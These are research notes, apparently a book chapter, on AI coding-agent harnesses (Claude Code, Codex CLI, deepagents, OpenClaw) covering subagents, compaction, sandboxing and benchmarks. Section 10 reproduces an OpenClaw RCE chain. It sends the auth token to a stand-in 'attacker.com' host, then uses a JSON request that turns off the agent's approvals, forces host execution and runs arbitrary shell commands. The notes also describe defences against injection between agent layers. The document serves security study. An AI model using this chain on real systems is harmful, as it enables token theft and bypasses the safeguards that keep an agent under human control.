# Deep agents: Claude Code, Cursor, OpenClaw internals — primary-source notes

## TL;DR (engineer must-knows, 2026-09-30)

- "Deep agent" is a named architecture, not marketing: LangChain's Harrison Chase (2025-07-30) defines it as an LLM-in-a-loop agent plus four things — **a detailed system prompt, a planning tool, sub-agents, and a filesystem** — citing Claude Code as the reference implementation [S21]. The `deepagents` OSS package (Python + JS) operationalizes this on top of LangGraph [S23].
- Claude Code's own docs now use "agentic harness" as a first-class glossary term: "the tools, context management, and execution environment that turn a language model into a capable coding agent. Claude Code is the harness; Claude is the model inside it" [S6].
- The planning tool is famously a **no-op**: Claude Code's TodoWrite/TaskCreate-TaskUpdate tools don't execute anything — they exist purely as a context-engineering trick to keep the model's attention on the plan [S21]. Manus independently converged on the same trick via a hand-maintained `todo.md` it rewrites every loop to "recite" the goal into recent attention [S30].
- Anthropic's long-running-agent research (2025-11-26) formalizes a **two-agent pattern**: an *initializer agent* (writes `init.sh`, a JSON feature list, first git commit) and a *coding agent* (reads `claude-progress.txt` + git log, does one feature, leaves a clean git state) — because compaction alone is not sufficient for multi-context-window work [S20].
- Subagents in Claude Code get a **fresh context window** (no parent history), their own system prompt, and return only a final text summary to the parent — this is the mechanism, not agent teams, that gives the token savings LangChain and Anthropic both describe [S2][S7].
- **Agent teams** (peer sessions with a shared task list and direct messaging) are a distinct, newer, and more expensive mechanism than subagents — teams use tmux/iTerm2 split panes or in-process panels, are still experimental (env-var gated), and Claude can silently promote a named subagent into a teammate once teams are enabled [S8].
- **Dynamic workflows** (`ultracode` keyword / `/effort ultracode`) move orchestration for dozens-to-hundreds of agents out of the conversation entirely into a runtime-executed JavaScript script — a third, more scalable rung above subagents and agent teams [S14][S12].
- Compaction is not magic: it summarizes, doesn't preserve. Skill descriptions loaded at startup do **not** reload after `/compact` — only skills you actually invoked get their body re-injected, capped at 5,000 tokens each [S7].
- Checkpointing (`/rewind`) and compaction are separate systems: checkpoints track file-tool edits per turn for local undo; they do **not** track Bash-command file changes or most subagent edits [S9].
- Permissions ≠ sandboxing. Claude Code, Codex CLI, and OpenClaw all now split "does the model need to ask" (permission/approval policy) from "what can the process technically touch" (OS-level sandbox: Seatbelt on macOS, bubblewrap/seccomp on Linux) — this is a convergent architecture across all three harnesses [S15][S32].
- 2026's most-cited empirical claim — "the harness matters more than the model" — is directly measurable: a September 2026 study running Claude Code, Codex, and Pi against the same two models on 64 SWE-Bench Pro tasks found resolve rate nearly harness-invariant (44-53%) while **cost varied up to ~2x** ($22.8 vs $45 for the same 64-task sweep) purely from token efficiency and KV-cache behavior [S34].
- OpenClaw (née Clawdbot → Moltbot) is the "deep agent as always-on personal assistant" case study: single long-lived **Gateway** process, typed WebSocket protocol, pluggable model/harness backends (including running Claude Code or Codex CLI as its execution engine), heartbeat/cron scheduler, and a real, patched 1-click RCE (CVE-2026-25253) from a `gatewayUrl` query-param + no-Origin-check WebSocket server [S24][S26][S28].
- Terminal-Bench and SWE-Bench variants are explicitly framed by Anthropic and independent labs as evidence that harness engineering, not just model scale, drives agentic benchmark scores — separate teams report the *same* model scoring differently by tens of percentage points depending on harness [S34][S35][S36].

## Current state and versions (as of 2026-09-30)

- **Claude Code**: native-binary CLI (JS bundle replaced by native binaries as of week 16, 2026 [S19]), model default is Claude Sonnet 5 (since week 27, 2026), Opus 5 (since week 30), effort levels `low|medium|high|xhigh|max`, plus an `ultracode` orchestration mode that writes dynamic-workflow scripts [S14][S17][S19]. Subagent/agent-panel background execution is default since week 27, 2026 [S19].
- **Claude Agent SDK**: successor branding to "Claude Code SDK"; Python (`claude_agent_sdk`) and TypeScript (`@anthropic-ai/claude-agent-sdk`) packages bundle a native Claude Code binary [S11]. `AgentDefinition` schema documented with fields including `effort`, `background`, `omitClaudeMd`, `initialPrompt`, `permissionMode` [S12]. Depth/concurrency/spend caps (`CLAUDE_CODE_MAX_SUBAGENT_SPAWN_DEPTH` default 3, `CLAUDE_CODE_MAX_CONCURRENT_SUBAGENTS` default 20, `max_budget_usd`) require Claude Code v2.1.219+ [S12].
- **deepagents** (LangChain): "the batteries-included agent harness," built on LangGraph; ships sub-agents, pluggable filesystem backends, context summarization/offload-to-disk, shell access, persistent memory, human-in-the-loop, skills, and a companion terminal product "Deep Agents Code" explicitly compared to Claude Code/Cursor [S23]. `deepagents.js` exists as the JS port. LangChain also now sells "Managed Deep Agents" (hosted), v0.8 shipped auth/memory/channels around 2026-09-24 per the LangChain blog's own teaser list [S21].
- **OpenAI Codex CLI**: Rust-based, open source (Apache-2.0), installed via `npm install -g @openai/codex` or platform installer; docs live at `developers.openai.com/codex` → `learn.chatgpt.com`. Current model referenced in docs: "GPT-6 Astra" with async safety monitoring that can pause a running task [S32]. Feature-flag table (`config.toml` `[features]`) shows `multi_agent` (subagent collaboration tools) as **Stable, default true**, `hooks` Stable/true, `goals` Stable/true ("persisted goals and automatic continuation"), `memories` Experimental/false [S33].
- **OpenClaw** (formerly Clawdbot, then Moltbot): npm package `openclaw`, Node.js 24.16+/26.1+ required, pnpm-workspace monorepo, default Gateway bind `127.0.0.1:18789`. Latest release line in its own changelog index: v2026.9.6 (Sept 2026) [S26]. Governed by the independent "OpenClaw Foundation" (501(c)(3)); donors listed include Amazon, OpenAI, Red Hat, NVIDIA [S24].
- **Pi** (`@earendil-works/pi-coding-agent`, by Mario Zechner): "Pi Agent Harness," a monorepo of `pi-agent-core` (runtime), `pi-ai` (unified multi-provider LLM API), `pi-durable` (durable conversation/task/document runtime), `pi-tui`. No built-in permission system — runs with the launching user's OS permissions by default; recommends containerization (Gondolin micro-VM, Docker, or "OpenShell" policy sandbox) for isolation [S27]. OpenClaw's README credits Pi by name as an architectural ancestor/dependency [S24].
- **Terminal-Bench**: hosted by Stanford / Harbor / Laude Institute; now at version 4.0, with 2.1 still widely cited by vendors for comparability with older published numbers [S36][S37].

## Timeline

- **2025-07-18** — Manus publishes "Context Engineering for AI Agents": KV-cache design, mask-don't-remove tool spaces, filesystem-as-context, `todo.md` recitation, keeping errors in context [S30].
- **2025-07-30** — Harrison Chase (LangChain) publishes "Deep Agents," coining the term and the four-part definition (prompt, planning tool, sub agents, filesystem); ships `deepagents` pip package the same weekend [S21].
- **2025-11-26** — Anthropic publishes "Effective harnesses for long-running agents": initializer-agent / coding-agent pattern, feature-list JSON, progress files, browser-automation-based self-verification [S20].
- **2026-01-25/26** — "Clawdbot" (originally "WhatsApp Relay") launches as a weekend project by Peter Steinberger; draws attention fast ("Clawdbot bought me a car" HN post) [per HN metadata, S29].
- **2026-01-27** — Clawdbot renames to **Moltbot** after a "chaotic 5am Discord brainstorm" [S25].
- **2026-01-29/30** — Moltbot renames again to **OpenClaw**; Peter Steinberger's post says the project passed 100,000 GitHub stars and 2M weekly visitors within two months; ships Twitch/Google Chat channels, KIMI K2.5 & Xiaomi MiMo-V2-Flash model support, "34 security-related commits" [S25].
- **2026-02-01** — depthfirst discloses **CVE-2026-25253**: 1-click RCE against OpenClaw via `gatewayUrl` query-param hijack + unauthenticated-origin WebSocket + `exec.approvals.set`/`config.patch` to disable sandboxing, patched with a gateway-URL confirmation modal; "all versions up to v2026.1.24-1" vulnerable [S28].
- **2026-02-15** — "OpenClaw (ClawdBot) joins OpenAI" announced (per HN thread on a since-referenced tweet) — consistent with OpenAI later appearing as an OpenClaw Foundation donor, not owner [S29][S24].
- **2026-03-22 to 2026-04-21** — Wave of OpenClaw security/policy stories: "security nightmare dressed up as a daydream" (composio), Anthropic briefly disallowing Claude Code subscriptions to be used through OpenClaw (2026-04-03), then reversing course (2026-04-21: "Anthropic says OpenClaw-style Claude CLI usage is allowed again") [S29].
- **2026-04-30** — Report that "Claude Code refuses requests or charges extra if your commits mention 'OpenClaw'" circulates widely (1349 points on HN) [S29] — **flagged unverified**, sourced only from a tweet screenshot in the HN listing, not independently confirmed here.
- **2026 week 13-16 (Mar-Apr)** — Claude Code: auto mode for hands-off permissions, computer use built in, PR auto-fix in cloud; native binaries replace bundled JS (week 16) [S19].
- **2026 week 15 (Apr 6-10)** — Claude Code ships "Ultraplan" cloud planning and the Monitor tool with self-pacing `/loop` [S19].
- **2026 week 20 (May 11-15)** — Claude Code ships **agent view** (manage every session from one screen) and a `/goal`-style "keep working toward a goal until a condition holds" feature [S19].
- **2026 week 22 (May 25-29)** — Claude Code on Opus 4.8; ships **dynamic workflows** ("orchestrate large tasks with dynamic workflows") [S19].
- **2026 week 24 (Jun 8-12)** — Subagents allowed to **spawn their own subagents** (nested subagent trees) [S19].
- **2026 week 27 (Jun 29-Jul 3)** — Claude Sonnet 5 becomes Claude Code's default model; subagents run in the background by default [S19].
- **2026 week 30 (Jul 20-24)** — Opus 5 becomes the default Opus model [S19].
- **2026 week 32 (Aug 3-7)** — Claude Code sessions can **message each other** (cross-session messaging); self-hosted environments run cloud sessions on customer infra; **auto mode becomes the default permission mode** [S19].
- **2026 week 36 (Aug 31-Sep 4)** — "Claude Fable 5.1" model switch referenced in Claude Code changelog; computer use runs in background on Desktop [S19].
- **2026-09-08-13** — YC talk "Why the Harness Matters More Than the Model" circulates on HN multiple times [S29 metadata, video not opened — unverified content].
- **2026-09** — aistack publishes the Claude Code/Codex/Pi harness comparison quantifying cost/token/KV-cache differences at fixed resolve rate [S34]; also flags a **regression in Claude Code v2.1.233** that broke prefix-cache hit rate (29.8% mean vs ~97% for Codex/Pi on the same model), tracked at `github.com/anthropics/claude-code/issues/87227` [S34].
- **2026-09-10** — Cognition's SWE-2 model card reports Terminal-Bench 2.1 = 92.8 (highest in its own table) but Terminal-Bench 4.0 = 27.3, "long-horizon agentic work is where the gap to the frontier still lives" [S35].

## Mechanics

### 1. The LangChain "deep agent" definition, precisely

Per [S21], a shallow agent is "an LLM running in a loop calling tools" — the naive ReAct-style loop. A **deep agent** adds four things on top of the same loop:

1. **Detailed system prompt** — long, with few-shot examples of tool use in specific situations. Chase: "Claude Code's recreated system prompts are long... Without these system prompts, the agents would not be nearly as deep."
2. **Planning tool** — Claude Code's TodoWrite is explicitly called out as "basically a no-op... just context engineering strategy to keep the agent on track."
3. **Sub agents** — spawned to isolate context and split tasks; "allows for context management and prompt shortcuts."
4. **File system** — used both to complete tasks and as shared, persistent working memory across the agent and any sub-agents. Manus is cited as another deep agent that leans heavily on the filesystem for memory.

`deepagents` (the package) operationalizes all four: a Claude-Code-inspired system prompt, a no-op todo tool, sub-agent spawning, and a "mocked virtual file system" backed by LangGraph state [S21][S23]. **Cross-link → ch.02 (context engineering)** for the file-system-as-context pattern in depth, and **ch.03 (tool design)** for planning-tool-as-no-op as a tool-design technique.

### 2. Claude Code's own architecture vocabulary (glossary, verbatim definitions) [S6]

- **Agentic harness**: "the tools, context management, and execution environment that turn a language model into a capable coding agent. Claude Code is the harness; Claude is the model inside it."
- **Agentic loop**: "gather context, take action, verify results, and repeat until done." Hooks, skills, and MCP "plug into specific phases of this loop."
- **Subagent**: "runs in its own context window with a custom system prompt, specific tool access, and independent permissions... stays inside the session that spawned it." Built-ins: Explore, Plan, general-purpose.
- **Agent teams**: "Multiple independent Claude Code sessions coordinated by a team lead, with a shared task list and peer-to-peer messaging" — explicitly contrasted with subagents, which "report only to the parent."
- **Compaction**: "Automatic summarization... Older tool outputs are cleared first, then the conversation is summarized." CLAUDE.md and auto memory "survive compaction and reload from disk; instructions given only in conversation may be lost."
- **Verification loop**: "You give Claude a check it can run... and Claude iterates until the check passes instead of stopping after one attempt" — named as prerequisite for `/goal`, unattended runs, and dynamic workflows.

### 3. The agent loop, formally (Claude Agent SDK) [S11]

Five message types drive the loop: `SystemMessage` (subtypes `init`, `compact_boundary`, `informational`, `worker_shutting_down`), `AssistantMessage` (one per content block), `UserMessage` (tool results), `StreamEvent` (partial-message mode only), `ResultMessage` (terminal). A **turn** = one tool-call round trip; the loop ends when Claude emits a response with **no** tool calls. Caps: `max_turns` (tool-use turns only), `max_budget_usd` (covers subagent spend too — hitting it stops background subagents and fails further spawns with `Budget limit reached`).

**COMPOSED control-flow sketch** (from the docs' own numbered description, [S11]):
```
1. receive prompt -> SystemMessage(init)
2. Claude evaluates -> AssistantMessage(text|tool_use)*
3. SDK executes tools -> UserMessage(tool_result)
4. repeat 2-3 until AssistantMessage has no tool_use
5. ResultMessage(subtype, total_cost_usd, usage, session_id)
```

Parallel tool execution: read-only tools (Read/Glob/Grep, MCP tools marked `readOnlyHint`) run concurrently; state-mutating tools (Edit/Write/Bash) run sequentially [S11].

### 4. Subagents vs agent teams vs dynamic workflows — three orchestration rungs

| | Subagents [S2][S12] | Agent teams [S8] | Dynamic workflows [S14] |
|---|---|---|---|
| What it is | worker Claude spawns via `Agent` tool | peer sessions + team lead | JS script the runtime executes |
| Context | fresh window, no parent history; only final text returns | own window, fully independent | script variables, not a model context at all |
| Who decides next step | Claude, turn by turn | the lead agent, turn by turn | the script |
| Communication | returns a result to caller (named subagents can also message each other) | direct peer-to-peer + shared task list | N/A — orchestration is code |
| Scale | "a few delegated tasks per turn" | "a handful of long-running peers" | "dozens to hundreds of agents per run" |
| Token cost | lower — summarized back | higher — each teammate is a full session | isolated from conversation context entirely |
| Enabling | default; built-in `general-purpose`/Explore/Plan | `CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS=1`, interactive-only | `ultracode` keyword or `/effort ultracode`; needs paid plan/API |

Key subtlety: once agent teams are enabled, Claude may **name** an ordinary subagent (so it can message it later), and per [S8] "while agent teams are enabled, a subagent that Claude names launches as a teammate" — teams can form even when the user never asked for one. This is a documented footgun with its own escape hatch (`CLAUDE_CODE_EXPERIMENTAL_AGENT_TEAMS=0`).

Nested subagent depth/concurrency caps (Agent SDK, requires TS SDK v0.3.219+/Python v0.2.127+, bundling Claude Code v2.1.219+) [S12]:

```
CLAUDE_CODE_MAX_SUBAGENT_SPAWN_DEPTH   default 3   (1 = no nesting)
CLAUDE_CODE_MAX_CONCURRENT_SUBAGENTS   default 20
max_budget_usd / maxBudgetUsd          default unlimited
```//COMPOSED table transcription of the doc's prose, values VERBATIM from [S12]

### 5. Anthropic's long-running-agent harness pattern [S20] — VERBATIM artifacts

The initializer agent writes three artifacts on the very first session; every later "coding agent" session reads them before doing anything:

- `init.sh` — script that starts the dev server, so later sessions don't burn tokens rediscovering how to run the app.
- `claude-progress.txt` — free-text log of what happened each session.
- `feature_list.json` — structured, JSON (not Markdown — "the model is less likely to inappropriately change or overwrite JSON files compared to Markdown files"), one entry per end-to-end feature, all starting `"passes": false`.

VERBATIM feature-entry example from [S20]:
```json
{
 "category": "functional",
 "description": "New chat button creates a fresh conversation",
 "steps": [
   "Navigate to main interface",
   "Click the 'New Chat' button",
   "Verify a new conversation is created",
   "Check that chat area shows welcome state",
   "Verify conversation appears in sidebar"
 ],
 "passes": false
}
```
Coding agents may only flip `passes` after testing end-to-end (Puppeteer MCP browser automation), and are told "It is unacceptable to remove or edit tests." Every coding-agent session opens with the same bootstrap sequence (VERBATIM from [S20]): `pwd` → read `claude-progress.txt` → read `feature_list.json` → `git log --oneline -20` → run `init.sh` → smoke-test the running app → pick one unfinished feature.

Two failure modes this fixes: (1) the agent tries to one-shot the whole app and runs out of context mid-feature, leaving the next session to guess what was half-built; (2) a later session sees *some* progress and prematurely declares the whole project done. **Open question the paper flags itself**: whether a single general-purpose coding agent or a multi-agent architecture (dedicated testing/QA/cleanup agents) performs better across many context windows — unresolved as of publication [S20].

### 6. Context window mechanics, with numbers [S7]

Claude Code's interactive context-window explainer (itself a component describing its own budgeting model) uses a simulated 200,000-token window and per-component token costs (illustrative, not measured, per the page's own caveat):

| Component | Illustrative tokens | Notes |
|---|---|---|
| System prompt | 4,200 | always loaded first, invisible |
| Auto memory (MEMORY.md) | 680 | first 200 lines or 25KB, whichever comes first |
| Environment info | 280 | cwd, platform, git status |
| MCP tool names (deferred) | 120 | full schemas load on demand via tool search |
| Skill descriptions | 450 | **does not reload after `/compact`**; only invoked skills get body re-injected |
| ~/.claude/CLAUDE.md | 320 | |
| Project CLAUDE.md | 1,800 | tip: "keep it under 200 lines" |

Subagent context is **separate and not counted against the parent**: in the walkthrough, a research subagent reads 6,100 tokens of files and returns a 420-token summary — "that's the context savings" [S7]. After `/compact`, the page states the summary block "keeps: your requests and intent, key technical concepts, files examined or modified with important code snippets, errors and how they were fixed, pending tasks, and current work... full tool outputs and intermediate reasoning are gone." Claude Code also re-reads up to five most-recently-modified files and re-injects invoked-skill bodies (capped 5,000 tokens/skill) [S7].

### 7. Filesystem, skills, memory, hooks as harness primitives (Claude Code) [S13][S6]

`settingSources` (SDK) controls which of `project` / `user` / `local` filesystem inputs load — omitting it defaults to all three. A short but important nuance for **multi-tenant deployments**: several inputs are read **regardless** of `settingSources` — managed policy, `~/.claude.json`, auto memory, claude.ai MCP connectors, and `sandbox.credentials` deny/mask entries — so isolation requires `settingSources: []` **and** `CLAUDE_CODE_DISABLE_AUTO_MEMORY=1` explicitly [S13].

Hooks come in two forms that run side by side: **filesystem hooks** (shell/http/mcp_tool/prompt/agent handlers declared in `settings.json`, fire in the main agent and its subagents) and **programmatic hooks** (callbacks passed to `query()`, fire inside subagents too, carry `agent_id`/`agent_type`) [S13]. Key hook events for orchestration: `PreToolUse`, `PostToolUse`, `UserPromptSubmit`, `Stop`, `SubagentStart`/`SubagentStop`, `PreCompact`, and (agent-teams-specific) `TeammateIdle`, `TaskCreated`, `TaskCompleted` [S8][S11].

### 8. Permissions vs sandboxing — convergent design across three harnesses

**Claude Code** [S15]: OS-level enforcement — **macOS: Seatbelt**; **Linux/WSL2: bubblewrap**. Filesystem isolation default: write access limited to cwd + `--add-dir` dirs + `$TMPDIR`; read access is broad by default (including `~/.ssh`, `~/.aws/credentials` unless `sandbox.credentials` blocks it explicitly). Network isolation runs through an outside-the-sandbox **proxy**; no domains pre-allowed by default; per-command allowed-domain lists in auto mode (v2.1.271+) let the classifier approve exactly the hosts a command names. "Protected paths" (settings, hooks, `.git/{HEAD,objects,refs}`) can never be unblocked by an allow rule — the *only* way to remove that protection is disabling filesystem isolation wholesale.

**OpenAI Codex CLI** [S32]: two-layer model — **sandbox mode** (what's technically possible: `read-only` / `workspace-write` / `danger-full-access`) × **approval policy** (`on-request` / `never` / granular per-category). Same OS primitives: **macOS Seatbelt** (`sandbox-exec -p`), **Linux `bwrap` + `seccomp`**, native **Windows sandbox** (or WSL2 reusing the Linux path). Protected paths inside a writable root: `.git`, `.agents`, `.codex` (recursively read-only). Network is off by default even in `workspace-write`; a `network_proxy` feature adds domain allow/deny rules (`*.example.com` subdomain match, `**.example.com` apex+subdomain, `deny` always beats `allow`). `web_search` defaults to `"cached"` (pre-indexed results — explicitly to reduce prompt-injection exposure from live pages) with `"live"`/`"disabled"`/`"indexed"` alternatives.

**OpenClaw** [S26][S24]: "Tools run on the host for the main session unless you configure sandboxing" — sandboxing is opt-in, with backends listed in its docs tree as Docker, Podman, SSH, "OpenShell," and "Crabbox." Approval is via `exec-approvals.json`. The CVE below shows exactly what happens when the *API* that manages these protections is itself reachable without proper origin validation — sandboxing and approvals both turned out to be bypassable **through the control plane**, not by breaking the sandbox technically [S28].

**Pattern to name in the book**: all three separate "may the agent even ask" (permission/approval) from "can the OS actually stop it" (sandbox), and all three that use OS sandboxing converge on the same two primitives (Seatbelt, bubblewrap/bwrap+seccomp). **Cross-link → ch.16 (security)**.

### 9. OpenClaw architecture in detail [S24][S26]

- **Gateway**: single long-lived daemon per host; owns all messaging-platform sessions (WhatsApp via Baileys, Telegram via grammY, Slack, Discord, Signal, iMessage, WebChat); "one Gateway per host... the only place that opens a WhatsApp session."
- **Wire protocol** (VERBATIM, [S26]): WebSocket, JSON text frames. First frame must be `connect`. After handshake:
  ```
  Requests: {type:"req", id, method, params} -> {type:"res", id, ok, payload|error}
  Events:   {type:"event", event, payload, seq?, stateVersion?}
  ```
  Shared-secret auth via `connect.params.auth.token`/`.password`; `gateway.auth.mode = "none"` disables auth entirely (explicitly flagged: "Keep that mode off public or untrusted ingress"). Idempotency keys required for side-effecting methods (`send`, `agent`).
- **Clients**: macOS app / CLI / web admin — one WS connection each, `role` unset; **Nodes** (macOS/iOS/Android/headless) connect with `role: "node"` plus device identity and capability/command declarations (`camera.*`, `screen.record`, `location.get`).
- **Agent runtime is pluggable**: OpenClaw's docs tree lists first-class "Codex harness" and "Copilot SDK harness" plugin surfaces — i.e., OpenClaw can drive Claude, Codex, or other CLI backends as its execution engine, with its own supervision, queue-steering, and compaction-mirroring layer on top [S26 nav tree].
- **Scheduling**: one `GatewayScheduler` per Gateway kernel drives cron/heartbeat wakeups; after sleep, "a late wake dispatches each runnable, due registration once"; missed ticks coalesce rather than fire repeatedly [S26].
- **Multi-agent inside OpenClaw**: docs list "Multi-agent routing," "Agent bindings," "Parallel specialist lanes," "Delegate architecture," and a separate "Sub-agents" tree (slash command, tool reference, thread-bound sessions, nested sub-agents, concurrency/recovery) — i.e., OpenClaw has built its own subagent layer independent of whichever underlying model harness it's driving [S26 nav tree].
- **Memory**: dedicated "Memory architecture," "Active memory," "Dreaming," "Compaction" doc tree; a pluggable "Honcho memory" backend alongside a "Builtin memory engine" [S26 nav tree]. **Cross-link → ch.11 (agent memory)**.
- **ClawHub**: the skill-sharing registry/marketplace, with its own publishing CLI, auth, and moderation docs [S26 nav tree]. **Cross-link → ch.06 (Agent Skills)**.

### 10. The OpenClaw 1-click RCE, step by step (CVE-2026-25253) [S28] — VERBATIM chain

1. **Token theft via URL param**: `app-settings.ts` reads a `gatewayUrl` query param and persists it, unauthenticated: `https://localhost?gatewayUrl=attacker.com` sets the app's gateway to `attacker.com`.
2. **Auto-connect**: `app-lifecycle.ts` calls `connectGateway()` immediately after settings apply — no confirmation.
3. **Token leak in handshake**: `gateway.ts` bundles the local `authToken` straight into the `connect` request sent to the (now attacker-controlled) gateway URL.
4. **CSWSH pivot to localhost**: browsers don't apply Same-Origin Policy to WebSocket connections; OpenClaw's WS server "fails to validate the WebSocket origin header, accepting requests from any site" — so a page at `attacker.com` can open `ws://localhost:18789` directly from the victim's browser.
5. **Disarm safety features via the *stolen token's own scopes*** (`operator.admin`, `operator.approvals`) — no sandbox exploit needed:
   ```json
   { "method": "exec.approvals.set",
     "params": { "defaults": { "security": "full", "ask": "off" } } }
   ```
   then `config.patch` to set `tools.exec.host = "gateway"` (forces host execution instead of container).
6. **RCE**: a `node.invoke` request with `command: "system.run"` and an arbitrary shell command.

Patch: added a gateway-URL confirmation modal (killed the silent auto-connect in step 2). Affected: "all versions up to v2026.1.24-1." **This is a textbook case for ch.16**: the vulnerability was never in the sandbox implementation — it was in a **control-plane trust boundary** (unauthenticated origin + a token with god-mode API scopes).

### 11. Manus's context-engineering techniques relevant to deep-agent harness design [S30]

(Full depth belongs in ch.02; summarized here for the "deep agent" characteristics it shares with Claude Code / deepagents.)

- **KV-cache hit rate** as "the single most important metric for a production agent" — stable prompt prefixes, append-only context, deterministic JSON serialization (unstable key ordering silently breaks caches); explicit cache-breakpoint insertion where providers require it.
- **Mask, don't remove** — instead of dynamically adding/removing tool definitions (which invalidates cache and can produce schema-violating hallucinated calls against tools no longer in context), Manus uses **logit masking** driven by a state machine, with tool names given group-identifying prefixes (`browser_*`, `shell_*`) so a whole category can be masked at once.
- **Filesystem as unlimited, restorable context**: compression must be reversible — "the content of a web page can be dropped from the context as long as the URL is preserved."
- **Recitation** — Manus's agent writes/updates a `todo.md` roughly every loop specifically to push the global plan back into recent attention (average task ≈ 50 tool calls).
- **Keep errors in context** — "erasing failure removes evidence"; Manus treats error recovery as a primary signal of true agentic behavior, calling it underrepresented in academic benchmarks.
- **Avoid over-uniform few-shot context** — repetitive action/observation patterns cause the model to imitate the pattern past the point of usefulness (drift on batch tasks like reviewing 20 resumes); Manus deliberately injects small structured variation.

### 12. Building a minimal deep agent yourself — synthesis (COMPOSED from S20+S21+S23+S30, not a single source)

Minimum viable "deep agent" harness, per the union of primary sources above:
1. A tool loop (any provider's tool-calling API).
2. A **planning artifact** the model writes to and re-reads every turn — a todo list or JSON feature list; it need not *execute* anything (Claude Code, Manus, deepagents all treat this as a no-op / pure attention mechanism).
3. **Filesystem access** as the persistence layer — for scratch notes, for restorable compression (drop content, keep the path/URL), and as the interface sub-agents share.
4. **Sub-agent spawning** with a fresh context per sub-agent and only a text summary returned to the parent — this is what actually saves tokens, not the planning tool.
5. For **multi-session** (long-running) work specifically: an initializer phase that's prompted differently from every later session, writing a bootstrap script + a structured (JSON, not prose) progress/feature manifest + an initial commit; every later session reads those before acting and ends by updating them + committing.
6. A **verification loop** — an actual runnable check (tests, a dev server + browser automation, a build) — without one, "the only thing deciding the agent is finished is the agent itself" [S6, glossary: verification loop].
7. Separate **approval policy** from **OS sandbox** from day one if the agent will touch a real filesystem/network — bolting sandboxing on later is exactly the class of bug in §10.

## Numbers

- **Claude Code context window**: 200,000-token budget in the docs' own illustrative model; skill descriptions ≈450 tokens combined at startup, re-injected skill bodies capped at **5,000 tokens per skill** post-compaction [S7].
- **Checkpoints**: Claude Code keeps file snapshots for the **100 most recent checkpoints** per session, swept after ~**30 days** by default (`cleanupPeriodDays`) [S9].
- **Subagent limits** (Agent SDK, Claude Code v2.1.219+): max spawn depth default **3**, max concurrent subagents default **20** [S12].
- **Manus**: average input:output token ratio ≈ **100:1**; a typical task ≈ **50 tool calls**; KV-cache economics on Claude Sonnet at time of writing: cached input **$0.30/MTok** vs uncached **$3/MTok** — a 10x difference (Manus's own numbers, 2025-07-18, model/pricing as stated then) [S30].
- **aistack harness comparison** (Sept 2026; 64 tasks from SWE-Bench Pro; Qwen3.8-27B on 1×H200 and GLM-5.3-Flash on 4×H200; harnesses run "as-is" with default settings) [S34]:

  | Harness | Model | Resolved | Wall time | Input tokens | Output tokens | Cost (64-task sweep) |
  |---|---|---|---|---|---|---|
  | Claude Code | Qwen3.8-27B | 33/64 (52%) | 2.26h | 445.8M | 3.72M | — |
  | Codex | Qwen3.8-27B | 31/64 (48%) | 2.07h | 330.5M | 3.33M | $9 |
  | Pi | Qwen3.8-27B | 28/64 (44%) | 2.24h | 348.5M | 3.72M | $10.16 |
  | Claude Code | GLM-5.3-Flash | 32/64 (50%) | 2.48h | 480.2M | 3.97M | $45 |
  | Codex | GLM-5.3-Flash | 33/64 (52%) | 1.26h | 192.1M | 2.10M | $22.8 |
  | Pi | GLM-5.3-Flash | 32/64 (50%) | 2.48h | 366.4M | 3.79M | $45 |

  Same source: peak KV-cache utilization on Qwen3.8-27B — Codex 59.8%, Pi 72.1%, Claude Code 78.8%. A **regression in Claude Code v2.1.233** dropped mean prefix-cache hit rate to **29.84%** vs ~97% for Codex/Pi on the same model/config (tracked at `github.com/anthropics/claude-code/issues/87227`; numbers in the article are for the patched version) [S34].
- **Cognition SWE-2** (self-reported, per its Sept 2026 model card) [S35]: Terminal-Bench 2.1 = **92.8**, Terminal-Bench 4.0 = **27.3** (vs Fable 5.1's 55.8 and GPT-6 Astra's 57.9 on TB4.0 — "long-horizon agentic work is where the gap to the frontier still lives"); FrontierCode 1.1 Main = 50.0 (Fable 5.1: 50.9, GPT-6 Astra: 53.3); mean steps per run 53 (medium effort) vs 127 for its predecessor SWE-1.7.
- **Terminal-Bench 2.1** ("Ante" harness leaderboard, updated 2026-09-14, 89 tasks × 5 trials, official parameters): top public score cited as **83.9%**; DeepSeek V4 Flash 0731 with the Ante harness scored **82.7%** [S36]. (Leaderboard rows beyond these two were not independently re-verified here — see Unverified.)

## Pitfalls, limits, criticism

- **Compaction ≠ perfect memory transfer**: Anthropic's own long-running-agents research states compaction "doesn't always pass perfectly clear instructions to the next agent" — this is given as the reason initializer/progress-file scaffolding is needed at all, not an incidental detail [S20].
- **Subagent output is not automatically trustworthy or literal**: the parent may summarize a subagent's final message rather than pass it through verbatim; Claude Code additionally runs a defensive scan on subagent output for control-tag imitation (`<system-reminder>`-like strings) and turn-marker imitation (`Human:`/`Assistant:` at line start), inserting escape characters — implying this is a known injection vector between agent layers [S12].
- **Agent teams silently forming**: naming a subagent (which Claude does on its own to enable later messaging) launches it as a full teammate whenever the experimental teams flag is on — token cost and coordination overhead appear without an explicit user request for a "team" [S8].
- **Checkpointing gaps**: doesn't track Bash-driven file changes (`rm`, `mv`, `cp`), doesn't restore most subagent edits, skips symlinked/hard-linked paths, and doesn't checkpoint messages that join an already-running turn [S9].
- **"Harness matters" cuts both ways**: the aistack study found resolve rate nearly harness-invariant at fixed model — meaning some of the harness's marketed "quality" differentiation shows up in *cost and speed*, not task success, and version-to-version regressions (the v2.1.233 cache bug) can silently double your bill without changing accuracy at all [S34].
- **OpenClaw's core threat is architectural, not cryptographic**: CVE-2026-25253 exists because a trusted local control-plane API had god-mode scopes (`operator.admin`, `operator.approvals`) reachable by anyone who could get a token, and WebSocket servers don't get free-of-charge same-origin protection the way `http(s)` does — a generalizable warning for anyone building a Gateway-style architecture with a local control-plane socket [S28].
- **Pi (and by extension harnesses built on it) ships with *no* built-in permission system** — "By default, it runs with the permissions of the user and process that launched it," pushing isolation entirely onto the deployer via containerization [S27]. This is a materially different default posture than Claude Code's or Codex's approval+sandbox-by-default stance.
- **Open research question, stated by Anthropic itself**: single general-purpose coding agent vs specialized multi-agent (testing agent / QA agent / cleanup agent) architecture across long-running sessions — unresolved as of the Nov 2025 paper [S20].
- **Unverified/likely-exaggerated claim in the wild**: "Claude Code refuses requests or charges extra if your commits mention 'OpenClaw'" (HN, 1349 points, 2026-04-30) traces only to a tweet screenshot per the HN listing metadata gathered here — not confirmed against an Anthropic primary source in this research pass.

## What changed in the last 6 months (since ~2026-04)

- Agent teams shipped as an experimental, env-var-gated feature with its own doc, distinct from subagents (exact ship date not pinned in the fetched sources, but present in current docs as of 2026-09-30) [S8].
